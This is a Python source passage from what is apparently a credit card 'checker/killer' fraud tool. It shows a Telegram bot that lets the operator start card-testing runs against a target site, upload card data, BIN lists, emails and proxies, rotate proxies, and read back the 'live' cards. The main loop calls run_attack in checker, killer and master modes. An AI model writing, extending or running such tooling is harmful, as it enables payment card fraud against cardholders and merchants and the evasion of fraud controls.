        return f"(no {path})"
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        tail = lines[-n:] if len(lines) > n else lines
        return "".join(tail) if tail else "(empty)"
    except Exception as e:
        return str(e)

def _analytics_text() -> str:
    live = _count_lines("live.txt")
    dead = _count_lines("dead.txt")
    err = _count_lines("error.txt")
    unk = _count_lines("unknown.txt")
    total = live + dead + err + unk
    rate = f"{(live/total*100):.1f}%" if total else "n/a"
    st = BOT_STATE["stats"]
    running = "YES" if BOT_STATE["running"] else "NO"
    return (
        f"CC TOOL ANALYTICS\n"
        f"Mode: {BOT_STATE.get('mode') or CONFIG.get('mode')}\n"
        f"Running: {running}\n"
        f"Current: {BOT_STATE.get('current_card') or '-'}\n"
        f"Live: {live} (session {st['live']})\n"
        f"Dead: {dead} (session {st['dead']})\n"
        f"Error: {err} (session {st['error']})\n"
        f"Unknown: {unk}\n"
        f"Hits session: {st['hits']}\n"
        f"Live rate: {rate}\n"
        f"Target: {str(CONFIG.get('base_url',''))[:50]}\n"
        f"Hits/card: {CONFIG.get('hits_per_card')} | Proxy rot: {CONFIG.get('proxy_rotation')}\n"
        f"Just need live: {CONFIG.get('just_need_live')} / min {CONFIG.get('min_live_cards')}\n"
    )

def telegram_notify(text: str):
    token = TELE_BOT_TOKEN
    chat = BOT_STATE.get("chat_id")
    if not token or not chat:
        return
    try:
        import urllib.request
        import json as _json
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = _json.dumps({"chat_id": chat, "text": text[:4000]}).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=12)
    except Exception:
        pass

def start_telegram_bot_background():
    if not TELE_BOT_TOKEN:
        print(f"{rgb(255,200,0)}[i] TELE_BOT_TOKEN not set — Telegram disabled (local menu still works){RESET}")
        return None
    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
    except ImportError:
        print(f"{rgb(255,80,80)}[!] pip install python-telegram-bot python-dotenv{RESET}")
        return None

    async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            await update.message.reply_text("Unauthorized")
            return
        BOT_STATE["chat_id"] = update.effective_chat.id
        await update.message.reply_text("CC TOOL bot online.\n/help for commands\n/analytics for stats")

    async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        await update.message.reply_text(
            "CONTROL\n"
            "/status /analytics /config\n"
            "/set key value\n"
            "/run checker|killer|master\n"
            "/stop\n"
            "FILES\n"
            "/files /get file /clear live|dead|error|unknown|log\n"
            "/delete_line file substring\n"
            "Send document named proxy.txt / email.txt / bins.txt / data.txt to upload\n"
            "PROXY\n"
            "/proxies /proxy_check\n"
            "Local menu still works on the machine."
        )

    async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        await update.message.reply_text(_analytics_text())

    async def cmd_analytics(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        await update.message.reply_text(_analytics_text())

    async def cmd_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        keys = ["mode","base_url","data_file","proxy_file","email_file","bins_file",
                "hits_per_card","timeout_ms","headless","proxy_rotation","email_rotation",
                "random_identity","stop_on_live","just_need_live","min_live_cards",
                "cards_per_bin","bins_per_batch","proxy_max_fails","delay_between_hits",
                "killer_url","killer_hits_per_card"]
        lines = ["CONFIG"]
        for k in keys:
            if k in CONFIG:
                v = str(CONFIG[k])
                if len(v) > 60:
                    v = v[:57] + "..."
                lines.append(f"{k} = {v}")
        await update.message.reply_text("\n".join(lines)[:4000])

    async def cmd_set(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        if len(context.args) < 2:
            await update.message.reply_text("Usage: /set key value")
            return
        key = context.args[0]
        raw = " ".join(context.args[1:])
        if key not in CONFIG:
            await update.message.reply_text(f"Unknown key {key}")
            return
        old = CONFIG[key]
        if isinstance(old, bool):
            CONFIG[key] = raw.lower() in ("1","true","yes","y","on")
        elif isinstance(old, int):
            try:
                CONFIG[key] = int(raw)
            except ValueError:
                await update.message.reply_text("Need int")
                return
        elif isinstance(old, float):
            try:
                CONFIG[key] = float(raw)
            except ValueError:
                await update.message.reply_text("Need float")
                return
        else:
            CONFIG[key] = raw
        log_event("INFO", "TELEGRAM_SET", f"{key}={CONFIG[key]}")
        await update.message.reply_text(f"Set {key} = {CONFIG[key]}")

    async def cmd_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        if BOT_STATE["running"]:
            await update.message.reply_text("Already running. /stop first.")
            return
        if not context.args or context.args[0].lower() not in ("checker","killer","master"):
            await update.message.reply_text("Usage: /run checker|killer|master")
            return
        mode = context.args[0].lower()
        BOT_STATE["chat_id"] = update.effective_chat.id
        BOT_STATE["stop_requested"] = False
        BOT_STATE["mode"] = mode
        BOT_STATE["stats"] = {"live": 0, "dead": 0, "error": 0, "hits": 0}
        if mode == "killer":
            CONFIG["base_url"] = CONFIG["killer_url"]
            CONFIG["hits_per_card"] = CONFIG["killer_hits_per_card"]
        elif mode == "checker":
            CONFIG["hits_per_card"] = max(1, int(CONFIG.get("hits_per_card") or 1))
        CONFIG["mode"] = mode
        await update.message.reply_text(f"Starting {mode}...")

        def worker():
            BOT_STATE["running"] = True
            try:
                run_attack(mode)
            except Exception as e:
                log_event("FAIL", "TELEGRAM_RUN", str(e))
                telegram_notify(f"Run error: {e}")
            finally:
                BOT_STATE["running"] = False
                BOT_STATE["current_card"] = ""
                telegram_notify("Run finished.\n" + _analytics_text())

        threading.Thread(target=worker, daemon=True).start()

    async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        BOT_STATE["stop_requested"] = True
        await update.message.reply_text("Stop requested — halts after current card.")

    async def cmd_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        names = ["data.txt","proxy.txt","email.txt","bins.txt","live.txt","dead.txt",
                 "error.txt","unknown.txt","log.txt","proxy_report.txt","generated_cards.txt"]
        lines = ["FILES"]
        for n in names:
            if os.path.exists(n):
                lines.append(f"{n}: {_count_lines(n)} lines, {os.path.getsize(n)} B")
            else:
                lines.append(f"{n}: missing")
        await update.message.reply_text("\n".join(lines))

    async def cmd_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        if not context.args:
            await update.message.reply_text("Usage: /get live.txt")
            return
        path = context.args[0]
        allowed = {"live.txt","dead.txt","error.txt","unknown.txt","log.txt","proxy.txt",
                   "email.txt","bins.txt","data.txt","proxy_report.txt","generated_cards.txt","proxy_good.txt"}
        if path not in allowed:
            await update.message.reply_text("Not allowed")
            return
        text = _read_file_tail(path, 25)
        await update.message.reply_text(f"{path}\n{text[-3500:]}")

    async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        if not context.args:
            await update.message.reply_text("Usage: /clear live|dead|error|unknown|log")
            return
        mapping = {"live":"live.txt","dead":"dead.txt","error":"error.txt","unknown":"unknown.txt","log":"log.txt"}
        path = mapping.get(context.args[0], context.args[0])
        if path not in mapping.values():
            await update.message.reply_text("Only live/dead/error/unknown/log")
            return
        open(path, "w", encoding="utf-8").close()
        await update.message.reply_text(f"Cleared {path}")

    async def cmd_delete_line(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        if len(context.args) < 2:
            await update.message.reply_text("Usage: /delete_line proxy.txt substring")
            return
        path = context.args[0]
        sub = " ".join(context.args[1:])
        if path not in {"proxy.txt","email.txt","bins.txt","data.txt"}:
            await update.message.reply_text("Only proxy/email/bins/data")
            return
        if not os.path.exists(path):
            await update.message.reply_text("Missing")
            return
        with open(path, "r", encoding="utf-8") as f:
            lines = f.readlines()
        new_lines = [ln for ln in lines if sub not in ln]
        with open(path, "w", encoding="utf-8") as f:
            f.writelines(new_lines)
        await update.message.reply_text(f"Removed {len(lines)-len(new_lines)} lines from {path}")

    async def cmd_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        proxies = load_proxies(CONFIG.get("proxy_file", "proxy.txt"))
        sample = "\n".join(proxies[:8]) if proxies else "(none)"
        await update.message.reply_text(f"Proxies: {len(proxies)}\n{sample}")

    async def cmd_proxy_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        await update.message.reply_text("Proxy check started (max 25)...")
        chat_id = update.effective_chat.id

        def worker():
            try:
                proxies = load_proxies(CONFIG.get("proxy_file", "proxy.txt"))
                alive = suitable = 0
                lines = []
                for px in proxies[:25]:
                    info = test_single_proxy(px)
                    if info["alive"]:
                        alive += 1
                    if info["suitable"]:
                        suitable += 1
                    flag = "OK" if info["alive"] else "DEAD"
                    lines.append(f"{flag} {info.get('latency_ms') or '-'}ms {px[:45]}")
                msg = f"Proxy check\nTested {min(len(proxies),25)}/{len(proxies)}\nAlive {alive} Suitable {suitable}\n" + "\n".join(lines[:20])
                BOT_STATE["chat_id"] = chat_id
                telegram_notify(msg)
            except Exception as e:
                telegram_notify(f"Proxy check error: {e}")

        threading.Thread(target=worker, daemon=True).start()

    async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not _bot_allowed(update.effective_user.id):
            return
        doc = update.message.document
        if not doc:
            return
        name = (doc.file_name or "").lower()
        if "proxy" in name:
            target = CONFIG.get("proxy_file", "proxy.txt")
        elif "email" in name:
            target = CONFIG.get("email_file", "email.txt")
        elif "bin" in name:
            target = CONFIG.get("bins_file", "bins.txt")
        elif "data" in name or "card" in name:
            target = CONFIG.get("data_file", "data.txt")
        else:
            await update.message.reply_text("Name file proxy/email/bins/data")
            return
        f = await context.bot.get_file(doc.file_id)
        await f.download_to_drive(target)
        await update.message.reply_text(f"Saved → {target}")

    def run_polling():
        app = Application.builder().token(TELE_BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", cmd_start))
        app.add_handler(CommandHandler("help", cmd_help))
        app.add_handler(CommandHandler("status", cmd_status))
        app.add_handler(CommandHandler("analytics", cmd_analytics))
        app.add_handler(CommandHandler("config", cmd_config))
        app.add_handler(CommandHandler("set", cmd_set))
        app.add_handler(CommandHandler("run", cmd_run))
        app.add_handler(CommandHandler("stop", cmd_stop))
        app.add_handler(CommandHandler("files", cmd_files))
        app.add_handler(CommandHandler("get", cmd_get))
        app.add_handler(CommandHandler("clear", cmd_clear))
        app.add_handler(CommandHandler("delete_line", cmd_delete_line))
        app.add_handler(CommandHandler("proxies", cmd_proxies))
        app.add_handler(CommandHandler("proxy_check", cmd_proxy_check))
        app.add_handler(MessageHandler(filters.Document.ALL, on_document))
        print(f"{rgb(0,255,170)}[+] Telegram bot polling...{RESET}")
        app.run_polling(drop_pending_updates=True, stop_signals=None)

    t = threading.Thread(target=run_polling, daemon=True)
    t.start()
    return t


if __name__ == "__main__":
    play_intro_banner()
    start_telegram_bot_background()
    for fname in ("live.txt", "dead.txt", "error.txt", "unknown.txt", "log.txt"):
        if not os.path.exists(fname):
            open(fname, "a", encoding="utf-8").close()

    while True:
        mode = select_mode()
        if mode is None:          # returned from PROXY CHECK
            continue
        while True:
            action = show_settings_menu(mode)
            if action == "start":
                if mode == "killer":
                    CONFIG["base_url"] = CONFIG["killer_url"]
                    CONFIG["hits_per_card"] = CONFIG["killer_hits_per_card"]
                run_attack(mode)
            elif action == "mode":
                break
